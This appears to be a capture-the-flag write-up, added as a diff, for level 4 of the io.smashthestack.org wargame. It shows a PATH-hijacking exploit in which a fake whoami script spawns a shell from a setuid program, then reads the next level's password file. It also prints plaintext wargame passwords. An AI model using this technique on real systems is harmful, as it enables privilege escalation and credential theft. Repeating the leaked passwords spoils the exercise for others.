@@ -1,0 +1,33 @@
+ssh level4@io.smashthestack.org
+password: 9C4Jxjc3O3IjB7nXej
+
+#####
+# Notes
+
+The code is calling another process using popen, whoami
+
+The trick is to take advantage of command precedence in Unix by referring to a separate script instead of the system binary.
+
+#####
+# Exploit
+
+level4@io:/levels$ which whoami
+/usr/bin/whoami
+level4@io:/levels$ echo $PATH
+/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+level4@io:~$ mkdir /tmp/jontsai_level04
+level4@io:~$ cat > /tmp/jontsai_level04/whoami
+#! /bin/sh
+/bin/sh
+^C
+level4@io:~$ chmod 0777 /tmp/jontsai_level04/whoami
+level4@io:~$ export PATH=/tmp/jontsai_level04:$PATH
+level4@io:~$ echo $PATH
+/tmp/jontsai_level04:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+level4@io:/levels$ which whoami
+/tmp/jontsai_level04/whoami
+level4@io:~$ cd /levels
+level4@io:/levels$ ./level04 
+sh-4.2$ cat /home/level5/.pass
+Welcome KGpWsju2vDpmxcxlvm
+level4@io:/levels$ sh-4.2$ 
